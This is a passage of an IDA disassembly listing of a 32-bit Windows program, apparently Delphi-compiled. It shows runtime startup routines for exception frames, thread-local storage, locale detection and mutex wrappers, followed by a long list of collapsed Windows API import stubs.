		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_404D0B

loc_404CCD:				; CODE XREF: sub_404CA0+69j
		mov	eax, [ebp+var_4]
		cmp	eax, ds:dword_416028
		jnz	short loc_404CE4
		mov	eax, [ebp+var_4]
		mov	eax, [eax]
		mov	ds:dword_416028, eax
		jmp	short loc_404D03
; ---------------------------------------------------------------------------

loc_404CE4:				; CODE XREF: sub_404CA0+36j
		mov	eax, ds:dword_416028
		test	eax, eax
		jz	short loc_404D03

loc_404CED:				; CODE XREF: sub_404CA0+61j
		mov	edx, [eax]
		cmp	edx, [ebp+var_4]
		jnz	short loc_404CFD
		mov	edx, [ebp+var_4]
		mov	edx, [edx]
		mov	[eax], edx
		jmp	short loc_404D03
; ---------------------------------------------------------------------------

loc_404CFD:				; CODE XREF: sub_404CA0+52j
		mov	eax, [eax]
		test	eax, eax
		jnz	short loc_404CED

loc_404D03:				; CODE XREF: sub_404CA0+42j
					; sub_404CA0+4Bj ...
		retn
; ---------------------------------------------------------------------------

loc_404D04:				; DATA XREF: sub_404CA0+Ao
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_404CCD
; ---------------------------------------------------------------------------

loc_404D0B:				; CODE XREF: sub_404CA0:loc_404D03j
					; DATA XREF: sub_404CA0+28o
		pop	ecx
		pop	ebp
		retn
sub_404CA0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_404D10	proc near		; CODE XREF: sub_4040E8+BFp
		mov	edx, [eax]
		test	edx, edx
		jz	short locret_404D24
		mov	dword ptr [eax], 0
		push	eax
		push	edx
		mov	eax, [edx]
		call	dword ptr [eax+8]
		pop	eax

locret_404D24:				; CODE XREF: sub_404D10+4j
		retn
sub_404D10	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404D28	proc near		; CODE XREF: sub_4041F8+DCp
					; sub_404314+C7p
		test	edx, edx
		jz	short loc_404D45
		push	edx
		push	eax
		mov	eax, [edx]
		push	edx
		call	dword ptr [eax+4]
		pop	eax
		mov	ecx, [eax]
		pop	dword ptr [eax]
		test	ecx, ecx
		jnz	short loc_404D3E
		retn
; ---------------------------------------------------------------------------

loc_404D3E:				; CODE XREF: sub_404D28+13j
		mov	eax, [ecx]
		push	ecx
		call	dword ptr [eax+8]
		retn
; ---------------------------------------------------------------------------

loc_404D45:				; CODE XREF: sub_404D28+2j
		mov	ecx, [eax]
		test	ecx, ecx
		mov	[eax], edx
		jz	short locret_404D53
		mov	eax, [ecx]
		push	ecx
		call	dword ptr [eax+8]

locret_404D53:				; CODE XREF: sub_404D28+23j
		retn
sub_404D28	endp


; =============== S U B	R O U T	I N E =======================================


sub_404D54	proc near		; CODE XREF: sub_403740+16p
					; sub_413668+2Ep ...

Buffer		= byte ptr -408h

		push	ebx
		push	esi
		add	esp, 0FFFFFC00h
		mov	esi, edx
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_404DA1
		cmp	dword ptr [ebx+4], 10000h
		jge	short loc_404D97
		push	400h		; cchBufferMax
		lea	eax, [esp+40Ch+Buffer]
		push	eax		; lpBuffer
		mov	eax, [ebx+4]
		push	eax		; uID
		mov	eax, [ebx]
		mov	eax, [eax]
		call	sub_4047D0
		push	eax		; hInstance
		call	LoadStringA
		mov	ecx, eax
		mov	edx, esp
		mov	eax, esi
		call	sub_403A84
		jmp	short loc_404DA1
; ---------------------------------------------------------------------------

loc_404D97:				; CODE XREF: sub_404D54+17j
		mov	eax, esi
		mov	edx, [ebx+4]
		call	sub_403B8C

loc_404DA1:				; CODE XREF: sub_404D54+Ej
					; sub_404D54+41j
		add	esp, 400h
		pop	esi
		pop	ebx
		retn
sub_404D54	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_404DAC	proc near		; CODE XREF: sub_404E74+ADp
					; sub_404E74+BEp

var_10		= dword	ptr -10h
LCData		= byte ptr -0Bh
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF0h
		push	ebx
		xor	edx, edx
		mov	[ebp+var_10], edx
		xor	edx, edx
		push	ebp
		push	offset loc_404E12
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		push	7		; cchData
		lea	edx, [ebp+LCData]
		push	edx		; lpLCData
		push	1004h		; LCType
		push	eax		; Locale
		call	GetLocaleInfoA
		lea	eax, [ebp+var_10]
		lea	edx, [ebp+LCData]
		mov	ecx, 7
		call	sub_403BF8
		mov	eax, [ebp+var_10]
		lea	edx, [ebp+var_4]
		call	sub_4027E0
		mov	ebx, eax
		cmp	[ebp+var_4], 0
		jz	short loc_404DFC
		xor	ebx, ebx

loc_404DFC:				; CODE XREF: sub_404DAC+4Cj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_404E19

loc_404E09:				; CODE XREF: sub_404DAC+6Bj
		lea	eax, [ebp+var_10]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_404E12:				; DATA XREF: sub_404DAC+Fo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_404E09
; ---------------------------------------------------------------------------

loc_404E19:				; CODE XREF: sub_404DAC+65j
					; DATA XREF: sub_404DAC+58o
		mov	eax, ebx
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_404DAC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_404E20	proc near		; DATA XREF: CODE:00415B88o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_404E6A
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_4175B4
		jnz	short loc_404E5C
		mov	eax, offset dword_417048
		call	sub_4026F8
		mov	eax, offset dword_417214
		call	sub_4026F8
		mov	eax, offset dword_4173E0
		call	sub_4026F8
		call	sub_401924

loc_404E5C:				; CODE XREF: sub_404E20+17j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_404E71

loc_404E69:				; CODE XREF: sub_404E20+4Fj
		retn
; ---------------------------------------------------------------------------

loc_404E6A:				; DATA XREF: sub_404E20+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_404E69
; ---------------------------------------------------------------------------

loc_404E71:				; CODE XREF: sub_404E20:loc_404E69j
					; DATA XREF: sub_404E20+44o
		pop	ebp
		retn
sub_404E20	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404E74	proc near		; DATA XREF: CODE:00415B84o
		sub	ds:dword_4175B4, 1
		jnb	locret_404F46
		mov	ds:byte_416008,	2
		mov	ds:dword_417014, offset	RaiseException
		mov	ds:dword_417018, offset	RtlUnwind
		mov	ds:byte_417046,	2
		mov	ds:dword_417000, offset	sub_404438
		call	sub_402BBC
		test	al, al
		jz	short loc_404EBB
		call	sub_402BEC

loc_404EBB:				; CODE XREF: sub_404E74+40j
		call	sub_402CB0
		mov	ds:word_41704C,	0D7B0h
		mov	ds:word_417218,	0D7B0h
		mov	ds:word_4173E4,	0D7B0h
		call	GetCommandLineA
		mov	ds:dword_41703C, eax
		call	sub_401170
		mov	ds:dword_417038, eax
		call	GetVersion
		and	eax, 80000000h
		cmp	eax, 80000000h
		jz	short loc_404F2D
		call	GetVersion
		and	eax, 0FFh
		cmp	ax, 4
		jbe	short loc_404F1C
		mov	ds:CodePage, 3
		jmp	short loc_404F3C
; ---------------------------------------------------------------------------

loc_404F1C:				; CODE XREF: sub_404E74+9Aj
		call	GetThreadLocale
		call	sub_404DAC
		mov	ds:CodePage, eax
		jmp	short loc_404F3C
; ---------------------------------------------------------------------------

loc_404F2D:				; CODE XREF: sub_404E74+8Aj
		call	GetThreadLocale
		call	sub_404DAC
		mov	ds:CodePage, eax

loc_404F3C:				; CODE XREF: sub_404E74+A6j
					; sub_404E74+B7j
		call	GetCurrentThreadId
		mov	ds:dword_417030, eax

locret_404F46:				; CODE XREF: sub_404E74+7j
		retn
sub_404E74	endp

; ---------------------------------------------------------------------------
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LocalAlloc_0. PRESS KEYPAD "+" TO	EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION LocalFree_0. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION TlsAlloc.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION TlsFree. PRESS KEYPAD "+"	TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION TlsGetValue. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION TlsSetValue. PRESS KEYPAD	"+" TO EXPAND]
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404F78	proc near		; CODE XREF: sub_404F8C+21p
		push	eax		; uBytes
		push	40h		; uFlags
		call	LocalAlloc_0
		retn
sub_404F78	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404F84	proc near		; CODE XREF: sub_404F8C+1p
		mov	eax, 8
		retn
sub_404F84	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404F8C	proc near		; CODE XREF: sub_404FD0+13p
					; sub_405048:loc_405062p
					; DATA XREF: ...
		push	ebx
		call	sub_404F84
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_404FCE
		cmp	ds:dwTlsIndex, 0FFFFFFFFh
		jnz	short loc_404FAB
		mov	eax, 0E2h
		call	sub_403988
; ---------------------------------------------------------------------------

loc_404FAB:				; CODE XREF: sub_404F8C+13j
		mov	eax, ebx
		call	sub_404F78
		test	eax, eax
		jnz	short loc_404FC2
		mov	eax, 0E2h
		call	sub_403988
; ---------------------------------------------------------------------------
		jmp	short loc_404FCE
; ---------------------------------------------------------------------------

loc_404FC2:				; CODE XREF: sub_404F8C+28j
		push	eax		; lpTlsValue
		mov	eax, ds:dwTlsIndex
		push	eax		; dwTlsIndex
		call	TlsSetValue

loc_404FCE:				; CODE XREF: sub_404F8C+Aj
					; sub_404F8C+34j
		pop	ebx
		retn
sub_404F8C	endp


; =============== S U B	R O U T	I N E =======================================


sub_404FD0	proc near		; DATA XREF: DATA:004160B0o
		mov	eax, 8
		test	eax, eax
		jz	short locret_404FF8
		call	TlsAlloc
		mov	ds:dwTlsIndex, eax
		call	sub_404F8C
		mov	eax, ds:dwTlsIndex
		push	eax		; dwTlsIndex
		call	TlsGetValue
		mov	ds:dword_41766C, eax

locret_404FF8:				; CODE XREF: sub_404FD0+7j
		retn
sub_404FD0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404FFC	proc near		; CODE XREF: sub_405024+9p
					; DATA XREF: DATA:004160B8o
		mov	eax, 8
		test	eax, eax
		jz	short locret_405023
		cmp	ds:dwTlsIndex, 0FFFFFFFFh
		jz	short locret_405023
		mov	eax, ds:dwTlsIndex
		push	eax		; dwTlsIndex
		call	TlsGetValue
		test	eax, eax
		jz	short locret_405023
		push	eax		; hMem
		call	LocalFree_0

locret_405023:				; CODE XREF: sub_404FFC+7j
					; sub_404FFC+10j ...
		retn
sub_404FFC	endp


; =============== S U B	R O U T	I N E =======================================


sub_405024	proc near		; DATA XREF: DATA:off_4160ACo
		mov	eax, 8
		test	eax, eax
		jz	short locret_405046
		call	sub_404FFC
		cmp	ds:dwTlsIndex, 0FFFFFFFFh
		jz	short locret_405046
		mov	eax, ds:dwTlsIndex
		push	eax		; dwTlsIndex
		call	TlsFree

locret_405046:				; CODE XREF: sub_405024+7j
					; sub_405024+15j
		retn
sub_405024	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_405048	proc near		; CODE XREF: sub_4025BC+20p
					; sub_402614+3p ...
		mov	cl, ds:byte_41765C
		mov	eax, ds:dwTlsIndex
		test	cl, cl
		jnz	short loc_40507D
		mov	edx, large fs:2Ch
		mov	eax, [edx+eax*4]
		retn
; ---------------------------------------------------------------------------

loc_405062:				; CODE XREF: sub_405048+3Dj
		call	sub_404F8C
		mov	eax, ds:dwTlsIndex
		push	eax		; dwTlsIndex
		call	TlsGetValue
		test	eax, eax
		jz	short loc_405077
		retn
; ---------------------------------------------------------------------------

loc_405077:				; CODE XREF: sub_405048+2Cj
		mov	eax, ds:dword_41766C
		retn
; ---------------------------------------------------------------------------

loc_40507D:				; CODE XREF: sub_405048+Dj
		push	eax		; dwTlsIndex
		call	TlsGetValue
		test	eax, eax
		jz	short loc_405062
		retn
sub_405048	endp


; =============== S U B	R O U T	I N E =======================================


sub_405088	proc near		; CODE XREF: sub_405094+2Ep
		mov	eax, offset dword_416094
		call	sub_404C90
		retn
sub_405088	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_405094	proc near		; CODE XREF: CODE:00415C04p
		mov	edx, offset dword_416094
		cmp	dword ptr [ebp+0Ch], 1
		jnz	short loc_4050C9
		push	eax
		push	edx
		mov	ds:byte_41765C,	1
		mov	ecx, [ebp+8]
		mov	ds:hModule, ecx
		mov	[edx+4], ecx
		mov	dword ptr [edx+8], 0
		mov	dword ptr [edx+0Ch], 0
		call	sub_405088
		pop	edx
		pop	eax

loc_4050C9:				; CODE XREF: sub_405094+9j
		push	ds:dword_417664
		mov	ecx, offset off_4160AC
		call	sub_403678
		retn
sub_405094	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4050DC	proc near		; DATA XREF: CODE:00415B80o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_405101
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_417668
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_405108

loc_405100:				; CODE XREF: sub_4050DC+2Aj
		retn
; ---------------------------------------------------------------------------

loc_405101:				; DATA XREF: sub_4050DC+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_405100
; ---------------------------------------------------------------------------

loc_405108:				; CODE XREF: sub_4050DC:loc_405100j
					; DATA XREF: sub_4050DC+1Fo
		pop	ebp
		retn
sub_4050DC	endp

; ---------------------------------------------------------------------------
		align 4

loc_40510C:				; DATA XREF: CODE:off_415B7Co
		sub	ds:dword_417668, 1
		retn

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_405114	proc near		; DATA XREF: CODE:00415B98o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_405139
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_417670
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_405140

loc_405138:				; CODE XREF: sub_405114+2Aj
		retn
; ---------------------------------------------------------------------------

loc_405139:				; DATA XREF: sub_405114+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_405138
; ---------------------------------------------------------------------------

loc_405140:				; CODE XREF: sub_405114:loc_405138j
					; DATA XREF: sub_405114+1Fo
		pop	ebp
		retn
sub_405114	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_405144	proc near		; DATA XREF: CODE:00415B94o
		sub	ds:dword_417670, 1
		retn
sub_405144	endp

; [00000006 BYTES: COLLAPSED FUNCTION AdjustTokenPrivileges. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetLengthSid. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetTokenInformation. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION InitializeSecurityDescriptor. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LookupPrivilegeValueA. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION OpenProcessToken.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION SetSecurityDescriptorDacl. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CloseHandle. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CreateEventA. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CreateFileA. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CreateFileMappingA. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CreateFileMappingA_0. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CreateFileMappingW. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CreateMutexA. PRESS KEYPAD "+" TO	EXPAND]
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_4051BC(LPSECURITY_ATTRIBUTES lpMutexAttributes, int, LPCSTR	lpName)
sub_4051BC	proc near		; CODE XREF: sub_40DEDC+DFp

lpMutexAttributes= dword ptr  8
arg_4		= dword	ptr  0Ch
lpName		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+lpName]
		push	eax		; lpName
		cmp	[ebp+arg_4], 1
		sbb	eax, eax
		inc	eax
		and	eax, 7Fh
		push	eax		; bInitialOwner
		mov	eax, [ebp+lpMutexAttributes]
		push	eax		; lpMutexAttributes
		call	CreateMutexA
		pop	ebp
		retn	0Ch
sub_4051BC	endp

; ---------------------------------------------------------------------------
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CreateMutexA_0. PRESS KEYPAD "+" TO EXPAND]
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_4051E4(LPSECURITY_ATTRIBUTES lpMutexAttributes, int, LPCSTR	lpName)
sub_4051E4	proc near		; CODE XREF: sub_40C210+B6p

lpMutexAttributes= dword ptr  8
arg_4		= dword	ptr  0Ch
lpName		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+lpName]
		push	eax		; lpName
		cmp	[ebp+arg_4], 1
		sbb	eax, eax
		inc	eax
		and	eax, 7Fh
		push	eax		; bInitialOwner
		mov	eax, [ebp+lpMutexAttributes]
		push	eax		; lpMutexAttributes
		call	CreateMutexA_0
		pop	ebp
		retn	0Ch
sub_4051E4	endp

; ---------------------------------------------------------------------------
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CreateMutexW. PRESS KEYPAD "+" TO	EXPAND]
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_40520C(LPSECURITY_ATTRIBUTES lpMutexAttributes, int, LPCWSTR lpName)
sub_40520C	proc near		; CODE XREF: sub_40C210+7Cp
					; sub_40C210+A8p

lpMutexAttributes= dword ptr  8
arg_4		= dword	ptr  0Ch
lpName		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+lpName]
		push	eax		; lpName
		cmp	[ebp+arg_4], 1
		sbb	eax, eax
		inc	eax
		and	eax, 7Fh
		push	eax		; bInitialOwner
		mov	eax, [ebp+lpMutexAttributes]
		push	eax		; lpMutexAttributes
		call	CreateMutexW
		pop	ebp
		retn	0Ch
sub_40520C	endp

; ---------------------------------------------------------------------------
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION DuplicateHandle. PRESS KEYPAD "+"	TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION EnterCriticalSection_0. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION EnumCalendarInfoA. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION FormatMessageA. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION FreeLibrary_0. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetACP. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetCPInfo. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetCurrentProcess. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetCurrentProcessId. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetCurrentThread.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetCurrentThreadId_0. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetDiskFreeSpaceA. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetLastError. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetLocaleInfoA_0.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetModuleFileNameA_0. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetModuleFileNameA_0_0. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetModuleFileNameW. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetModuleHandleA_0. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetModuleHandleA_0_0. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetModuleHandleW.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetProcAddress_0.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetStdHandle_0. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetStringTypeExA.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetThreadLocale_0. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetVersion_0. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetVersionExA. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION InitializeCriticalSection_0. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION IsBadReadPtr. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LeaveCriticalSection_0. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LoadLibraryA. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LoadLibraryW. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LoadLibraryExA_0.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LocalAlloc_1. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LocalFree_1. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION MapViewOfFile. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION OpenEventA. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION OpenFileMappingA.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION OpenFileMappingA_0. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION OpenFileMappingW.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION OpenMutexA. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION OpenMutexW. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION OpenProcess. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION ReleaseMutex. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION SetEvent.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION SetLastError. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION SetThreadPriority. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION Sleep. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION UnmapViewOfFile. PRESS KEYPAD "+"	TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION VirtualAlloc_0. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION VirtualFree_0. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION VirtualQuery. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION WaitForMultipleObjects. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION WaitForSingleObject. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION WriteFile_0. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION lstrcmpiA. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION lstrcmpiW. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION lstrlenW.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CharNextA_0. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION CharToOemA. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetSystemMetrics.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LoadStringA_0. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION MessageBoxA_0. PRESS KEYPAD "+" TO EXPAND]
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40541C	proc near		; CODE XREF: sub_4154A8+9Ap
					; sub_41557C+CBp
		xchg	eax, edx
		call	sub_402664
		retn
sub_40541C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_405424	proc near		; CODE XREF: sub_408368+1Ap
					; sub_4087C4+B7p ...
		xor	ecx, ecx
		call	sub_4027C0
		retn
sub_405424	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40542C	proc near		; DATA XREF: CODE:00415BA0o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_405451
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_417674
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_405458

loc_405450:				; CODE XREF: sub_40542C+2Aj
		retn
; ---------------------------------------------------------------------------

loc_405451:				; DATA XREF: sub_40542C+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_405450
; ---------------------------------------------------------------------------

loc_405458:				; CODE XREF: sub_40542C:loc_405450j
					; DATA XREF: sub_40542C+1Fo
		pop	ebp
		retn
sub_40542C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40545C	proc near		; DATA XREF: CODE:00415B9Co
		sub	ds:dword_417674, 1
		retn
sub_40545C	endp

; ---------------------------------------------------------------------------
off_405464	dd offset dword_405468	; DATA XREF: sub_40D1F8+2C6r
					; sub_40D1F8+3F4r
dword_405468	dd 44540B11h, 72614341h, 616E6964h, 46Ch, 0 ; DATA XREF: CODE:off_405464o
		dd 300h
		db 0
		dd offset off_401000
		db 8, 6Dh, 61h
		dd 70795464h, 0C08B7365h
off_405490	dd offset dword_405494	; DATA XREF: sub_40E94C+15Br
					; sub_40E94C+2AEr ...
dword_405494	dd 44540A11h, 696F5041h, 7265746Eh, 4, 0 ; DATA	XREF: CODE:off_405490o
		dd 0FFFFFFFFh, 0
		dd 64616D08h, 65707954h, 408D73h
off_4054BC	dd offset dword_405508	; DATA XREF: CODE:00406FEBr
					; sub_407058+Fr
		dd 2 dup(0)
		dd offset dword_405508
		dd 4 dup(0)
		dd offset word_40551A
		dd 8
		dd offset off_401024
